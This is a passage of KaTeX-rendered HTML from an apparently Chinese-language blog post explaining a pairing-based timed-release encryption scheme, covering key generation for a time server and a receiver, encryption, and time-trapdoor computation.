vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord text"><span class="mord cjk_fallback">群中的生成元</span></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span></p><p>以我的理解来说，H1是将01字符串映射到椭圆曲线，H2是将椭圆曲线上的点重新映射回有限域。</p><h2 id="加密和解密">加密和解密</h2><ol><li><p>首先时间服务器选取随机数<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi></mrow><annotation encoding="application/x-tex">s</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">s</span></span></span></span>作为私钥<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi><msub><mi>s</mi><mrow><mi>p</mi><mi>r</mi><mi>i</mi><mi>v</mi></mrow></msub></mrow><annotation encoding="application/x-tex">ts_{priv}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9012em;vertical-align:-0.2861em;"></span><span class="mord mathnormal">t</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mord mathnormal mtight" style="margin-right:0.02778em;">r</span><span class="mord mathnormal mtight">i</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span>，并且计算<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mo>⋅</mo><mi>P</mi></mrow><annotation encoding="application/x-tex">s\cdot P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4445em;"></span><span class="mord mathnormal">s</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span>作为其公钥<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi><msub><mi>s</mi><mrow><mi>p</mi><mi>u</mi><mi>b</mi></mrow></msub></mrow><annotation encoding="application/x-tex">ts_{pub}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9012em;vertical-align:-0.2861em;"></span><span class="mord mathnormal">t</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mord mathnormal mtight">u</span><span class="mord mathnormal mtight">b</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span></p></li><li><p>类似的，接收方选取随机数<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>u</mi><mo>∈</mo><msubsup><mi>Z</mi><mi>q</mi><mo>∗</mo></msubsup></mrow><annotation encoding="application/x-tex">u\in Z_q^*</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">u</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0718em;vertical-align:-0.3831em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6887em;"><span style="top:-2.453em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3831em;"><span></span></span></span></span></span></span></span></span></span>，作为其私钥<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>u</mi><mi>s</mi><mi>k</mi></mrow><annotation encoding="application/x-tex">usk</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">u</span><span class="mord mathnormal">s</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span>，以<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>u</mi><mi>P</mi></mrow><annotation encoding="application/x-tex">uP</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">u</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span>作为其公钥<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>u</mi><mi>p</mi><mi>k</mi></mrow><annotation encoding="application/x-tex">upk</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">u</span><span class="mord mathnormal">p</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span></p></li><li><p>给定消息<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span>、接收方公钥<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>u</mi><mi>p</mi><mi>k</mi></mrow><annotation encoding="application/x-tex">upk</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">u</span><span class="mord mathnormal">p</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span>、时间服务器公钥<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi><msub><mi>s</mi><mrow><mi>p</mi><mi>u</mi><mi>b</mi></mrow></msub></mrow><annotation encoding="application/x-tex">ts_{pub}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9012em;vertical-align:-0.2861em;"></span><span class="mord mathnormal">t</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mord mathnormal mtight">u</span><span class="mord mathnormal mtight">b</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span>以及发布时间<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi><mo>∈</mo><mo stretchy="false">{</mo><mn>0</mn><mo separator="true">,</mo><mn>1</mn><msup><mo stretchy="false">}</mo><mo>∗</mo></msup></mrow><annotation encoding="application/x-tex">T\in \{0,1\}^*</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7224em;vertical-align:-0.0391em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1</span><span class="mclose"><span class="mclose">}</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6887em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span></span></span></span>，发送方进行如下操作：</p><p>(1)随机选取数<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>r</mi><mo>∈</mo><msubsup><mi>Z</mi><mi>q</mi><mo>∗</mo></msubsup></mrow><annotation encoding="application/x-tex">r\in Z_q^*</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0718em;vertical-align:-0.3831em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6887em;"><span style="top:-2.453em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3831em;"><span></span></span></span></span></span></span></span></span></span>，计算<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>U</mi><mo>=</mo><mi>r</mi><mo>∗</mo><mi>P</mi></mrow><annotation encoding="application/x-tex">U=r*P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4653em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span></p><p>(2)计算<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>K</mi><mo>=</mo><mi>e</mi><mo stretchy="false">(</mo><mi>r</mi><msub><mi>H</mi><mn>1</mn></msub><mo stretchy="false">(</mo><mi>T</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><mi>u</mi><mi>P</mi><mo>+</mo><mi>s</mi><mi>P</mi><mo stretchy="false">)</mo><mo>=</mo><mi>e</mi><mo stretchy="false">(</mo><msub><mi>H</mi><mn>1</mn></msub><mo stretchy="false">(</mo><mi>T</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><mi>P</mi><msup><mo stretchy="false">)</mo><mrow><mi>r</mi><mo stretchy="false">(</mo><mi>u</mi><mo>+</mo><mi>s</mi><mo stretchy="false">)</mo></mrow></msup></mrow><annotation encoding="application/x-tex">K=e(rH_1(T),uP+sP)=e(H_1(T),P)^{r(u+s)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">e</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0813em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">u</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">s</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.138em;vertical-align:-0.25em;"></span><span class="mord mathnormal">e</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0813em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.888em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.02778em;">r</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">u</span><span class="mbin mtight">+</span><span class="mord mathnormal mtight">s</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span></span></span></span></p><p>(3)得到密文<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><mo>=</mo><mo>&lt;</mo><mi>U</mi><mo separator="true">,</mo><mi>V</mi><mo>&gt;</mo><mo>=</mo><mo>&lt;</mo><mi>r</mi><mi>P</mi><mo separator="true">,</mo><mi>M</mi><mo>⊕</mo><msub><mi>H</mi><mn>2</mn></msub><mo stretchy="false">(</mo><mi>K</mi><mo stretchy="false">)</mo><mo>&gt;</mo></mrow><annotation encoding="application/x-tex">C=&lt;U,V&gt;=&lt;rP,M\oplus H_2(K)&gt;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7224em;vertical-align:-0.0391em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;=&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0813em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span></span></span></span></p></li><li><p>在指定解密时间<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi><mo>∈</mo><mo stretchy="false">{</mo><mn>0</mn><mo separator="true">,</mo><mn>1</mn><msup><mo stretchy="false">}</mo><mo>∗</mo></msup></mrow><annotation encoding="application/x-tex">T\in\{0,1\}^*</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7224em;vertical-align:-0.0391em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1</span><span class="mclose"><span class="mclose">}</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6887em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span></span></span></span>，时间服务器使用私钥<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi><msub><mi>s</mi><mrow><mi>p</mi><mi>r</mi><mi>i</mi><mi>v</mi></mrow></msub></mrow><annotation encoding="application/x-tex">ts_{priv}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9012em;vertical-align:-0.2861em;"></span><span class="mord mathnormal">t</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mord mathnormal mtight" style="margin-right:0.02778em;">r</span><span class="mord mathnormal mtight">i</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span>，计算时间陷门<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>S</mi><mi>T</mi></msub><mo>=</mo><mi>t</mi><msub><mi>s</mi><mrow><mi>p</mi><mi>r</mi><mi>i</mi><mi>v</mi></mrow></msub><mo>⋅</mo><msub><mi>H</mi><mn>1</mn></msub><mo stretchy="false">(</mo><mi>T</mi><mo stretchy="false">)</mo><mo>=</mo><mi>s</mi><msub><mi>H</mi><mn>1</mn></msub><mo stretchy="false">(</mo><mi>T</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">S_T=ts_{priv}\cdot H_1(T)=sH_1(T)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.9012em;vertical-align:-0.2861em;"></span><span class="mord mathnormal">t</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mord mathnormal mtight" style="margin-right:0.02778em;">r</span><span class="mord mathnormal mtight">i</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0813em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">s</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0813em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mclose">)</span></span></span></span></p></li><li><p>在指定解密时间<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi><mo>∈</mo><mo stretchy="false">{</mo><mn>0</mn><mo separator="true">,</mo><mn>1</mn><msup><mo stretchy="false">}</mo><mo>∗</mo></msup></mrow><annotation encoding="application/x-tex">T\in\{0,1\}^*</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7224em;vertical-align:-0.0391em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1</span><span class="mclose"><span class="mclose">}</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6887em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span></span></span></span>，接收方使用私钥<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>u</mi><mi>s</mi><mi>k</mi></mrow><annotation encoding="application/x-tex">usk</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">u</span><span class="mord mathnormal">s</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span>计算自己的时间陷门<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>U</mi><mi>T</mi></msub><mo>=</mo><mi>u</mi><mi>s</mi><mi>k</mi><mo>⋅</mo><msub><mi>H</mi><mn>1</mn></msub><mo stretchy="false">(</mo><mi>T</mi><mo stretchy="false">)</mo><mo>=</mo><mi>u</mi><msub><mi>H</mi><mn>1</mn></msub><mo stretchy="false">(</mo><mi>T</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">U_T=usk\cdot H_1(T)=uH_1(T)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.109em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">u</span><span class="mord mathnormal">s</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0813em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">u</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0813em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span 